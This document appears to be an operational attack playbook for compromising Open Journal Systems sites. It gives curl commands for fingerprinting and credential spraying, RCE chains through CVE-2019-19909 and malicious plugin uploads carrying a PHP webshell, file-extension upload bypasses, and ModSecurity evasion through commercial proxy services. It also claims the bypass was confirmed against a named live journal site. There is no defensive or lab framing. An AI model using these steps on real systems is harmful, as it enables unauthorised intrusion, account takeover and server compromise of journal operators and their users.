# OJS (Open Journal Systems) Engagement Methodology

## Fingerprinting
```bash
# Version detection via OJS storm
python3 tools/exploit/ojs_storm.py --target https://ojs.target.com

# Manual version checks
curl -sk https://ojs.target.com/index.php/index/oai/Identify
curl -skI https://ojs.target.com | grep OJSSID

# Find all journals on the instance
curl -sk https://ojs.target.com | grep -oP 'index\.php/[a-z]+' | sort -u
```

## Known Vulnerabilities per Version

| Version | CVE | CVSS | Type | Auth Required |
|---------|-----|------|------|---------------|
| <= 3.1.2-2 | CVE-2019-19909 | 8.8 | PHP Object Injection (unserialize) | Journal Manager |
| 3.0.0 - 3.1.1-1 | CVE-2018-12229 | N/A | XSS | None |
| 3.3 | CVE-2024-25436 | 6.1 | XSS (Production module) | Authenticated |
| 3.3.0-16 | CVE-2023-5626 | 8.8 | CSRF (user role change) | Trick JM to click |
| 3.3.0-16 | CVE-2023-5894 | 5.4 | Stored XSS | Authenticated |

**CVE-2019-19909 detail**: Unserialize in OJS report generator. Code injection via crafted URL
when a Journal Manager visits it. Requires JM-level access.

## Credential Spray (OJS-specific)
```bash
# Login endpoint per journal
curl -sk -c /tmp/ojs_cookies.txt -d "username=USER&password=PASS" \
  "https://ojs.target.com/index.php/JOURNAL/login/signIn"

# Check role from redirect
# /submissions → Author
# /management → Journal Manager (JACKPOT)
# /login/signIn → Login failed (check for "Invalid username/password")

# Verify role level
curl -sk -b /tmp/ojs_cookies.txt \
  "https://ojs.target.com/index.php/JOURNAL/management"
# HTTP 302 redirect → JM access!
# "authorizationDenied" in URL → Author/Reader only
```

## Journal Manager → RCE Chain
```bash
# If Journal Manager access obtained:
# CVE-2019-19909 — unserialize in report generator
# Exploit: send crafted URL to the JM's browser, or access directly
# Report generator path (varies by OJS version):
# /index.php/JOURNAL/management/tools/report

# Alternative: Plugin upload (if plugin upload is enabled)
# /index.php/JOURNAL/management/tools/pluginGallery
# Upload a malicious plugin .tar.gz containing PHP webshell
```

## Author → RCE Chain
If only Author access:
1. Check userGroupId in submission page source — if empty, try other credentials
2. Start new submission: POST to /index.php/JOURNAL/submission/saveStep/1 with sectionId and all 6 checklists
3. Upload file at step 2: POST multipart to /index.php/JOURNAL/submission/saveStep/2
4. OJS accepts: .doc, .docx, .pdf, .odt, .rtf, .xml
5. For PHP upload bypass: server must be Apache for .php.gif double extension
6. Not Apache (nginx/cloudflare) → try .phtml, .phar, or XML-based injection

## ModSecurity Bypass (OJS-specific)
OJS uses `$$$call$$$` pattern in API URLs which triggers ModSecurity:
```
Blocked: /index.php/JOURNAL/$$$call$$$/grid/files/submission/submission-files-grid/upload
Blocked: /index.php/JOURNAL/author/submit/2
```

Bypass methods (ordered by reliability):
1. **9proxy tunneling**: `curl --proxy http://np_user:user@example.com:17521`
2. **BrightData web_unlocker3**: Same as 9proxy but BrightData zone
3. **URL encoding**: Replace `$` with `%24` — sometimes works, sometimes doesn't

The proxy approach was confirmed working 2026-05-31 on ojs.amhinternational.com.

## Common OJS Pitfalls
- **Cloudflare fronting**: `Server: cloudflare` header — need origin bypass or proxy
- **Not Apache**: .php.gif double extension won't work on nginx/cloudflare
- **Email verification required**: OJS storm registers accounts but email verification blocks login
- **userGroupId empty**: User has Author role but no group assignment → can't submit
- **Multiple journals**: Must spray creds on EACH journal separately — journal-specific roles
- **accessRoles encoding**: JS shows accessRoles as bitfield: 65536=Author, 4096=Reviewer, 1048576=Reader, 16=Manager
